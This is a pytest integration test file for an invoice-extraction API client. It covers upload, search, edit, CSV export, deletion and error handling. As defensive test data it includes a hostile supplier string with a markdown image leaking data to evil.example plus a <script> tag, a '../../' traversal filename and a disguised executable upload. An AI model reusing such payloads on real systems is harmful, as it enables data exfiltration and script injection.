"""The UI's ApiClient against the REAL FastAPI application (in memory), not a hand-made mock."""

from __future__ import annotations

import pytest
from fastapi.testclient import TestClient

from src.api import routes
from src.api.app import create_app
from src.models.schemas import ExtractedInvoice, InvoiceLineItem
from src.ui.api_client import ApiClient
from src.ui.errors import ApiError

pytestmark = pytest.mark.integration

TOKEN = "r" * 43
PDF = b"%PDF-1.4\n1 0 obj\n<<>>\nendobj\n%%EOF\n"
HOSTILE_SUPPLIER = "![x](http://evil.example/?d=secret) <script>alert(1)</script>"


def _invoice(supplier: str = "Orange SA") -> ExtractedInvoice:
    return ExtractedInvoice(
        invoice_number="F-2026-001",
        date="2026-09-10",
        supplier=supplier,
        client="Dupont SARL",
        lines=[InvoiceLineItem(description="Forfait", quantity=1, unit_price=100.0, total=100.0)],
        subtotal_ht=100.0,
        tva_rate=0.2,
        total_ttc=120.0,
    )


@pytest.fixture(autouse=True)
def _config(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("API_TOKEN", TOKEN)
    monkeypatch.setenv("ALLOWED_HOSTS", "testserver")
    monkeypatch.setenv("MAX_UPLOAD_SIZE_MB", "1")
    monkeypatch.setattr(routes, "process_invoice", lambda _path: _invoice())


@pytest.fixture
def api():
    with TestClient(create_app(), headers={"Authorization": f"Bearer {TOKEN}"}) as http:
        yield ApiClient(http)


def test_the_whole_life_of_an_invoice_through_the_client(api: ApiClient) -> None:
    api.check()

    created = api.upload("../../facture.pdf", PDF)
    assert created.display_name == "facture.pdf" and created.status == "high"
    assert created.invoice.supplier == "Orange SA" and created.invoice.total_ttc == 120.0
    assert created.expires_at > created.created_at

    assert api.get(created.id) == created
    rows = api.list_invoices(query="orange")
    assert [row.id for row in rows] == [created.id] and rows[0].total_ttc == 120.0
    assert api.list_invoices(query="nothing-like-this") == []

    fixed = created.invoice.model_dump(exclude={"extraction_confidence", "warnings"})
    assert api.update(created.id, {**fixed, "total_ttc": 999.0}).status == "low"
    assert api.list_invoices(status="low")[0].id == created.id

    export = api.export_csv(ids=[created.id])
    assert export.filename == "invoices_2026-09-10_to_2026-09-10.csv"
    assert export.content.startswith(b"\xef\xbb\xbf") and b"Orange SA" in export.content
    assert b"Forfait" in api.export_csv(ids=[created.id], kind="lines").content

    api.delete(created.id)
    with pytest.raises(ApiError) as gone:
        api.get(created.id)
    assert gone.value.status == 404 and str(gone.value) == "Facture introuvable."


def test_a_wrong_token_is_reported_as_a_configuration_problem() -> None:
    with TestClient(create_app(), headers={"Authorization": "Bearer " + "x" * 43}) as http:
        with pytest.raises(ApiError) as info:
            ApiClient(http).list_invoices()
    assert info.value.status == 401 and "API_TOKEN" in str(info.value)


def test_the_apis_refusals_arrive_as_readable_messages(api: ApiClient) -> None:
    with pytest.raises(ApiError) as too_big:
        api.upload("big.pdf", PDF + b"0" * (3 * 1024 * 1024))
    assert too_big.value.status == 413 and str(too_big.value) == "Fichier trop volumineux."

    with pytest.raises(ApiError) as not_pdf:
        api.upload("x.pdf", b"MZ\x90\x00 an executable")
    assert not_pdf.value.status == 415 and "PDF" in str(not_pdf.value)

    created = api.upload("f.pdf", PDF)
    with pytest.raises(ApiError) as invalid:
        api.update(created.id, {"extraction_confidence": "high"})  # a field a client must not set
    assert invalid.value.status == 422 and str(invalid.value) == "Requête invalide."


def test_rate_limit_reaches_the_client_with_its_retry_delay(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv("UPLOAD_RATE_LIMIT_PER_MINUTE", "1")
    with TestClient(create_app(), headers={"Authorization": f"Bearer {TOKEN}"}) as http:
        api = ApiClient(http)
        api.upload("a.pdf", PDF)
        with pytest.raises(ApiError) as info:
            api.upload("b.pdf", PDF)
    assert info.value.status == 429 and 1 <= (info.value.retry_after or 0) <= 60


def test_hostile_extracted_text_reaches_the_ui_as_plain_data(
    api: ApiClient, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The client does not interpret anything; escaping is the display layer's job (safe.py)."""
    monkeypatch.setattr(routes, "process_invoice", lambda _path: _invoice(HOSTILE_SUPPLIER))
    created = api.upload("f.pdf", PDF)
    assert created.invoice.supplier == HOSTILE_SUPPLIER
    assert isinstance(created.invoice.supplier, str)
    assert api.list_invoices()[0].supplier == HOSTILE_SUPPLIER
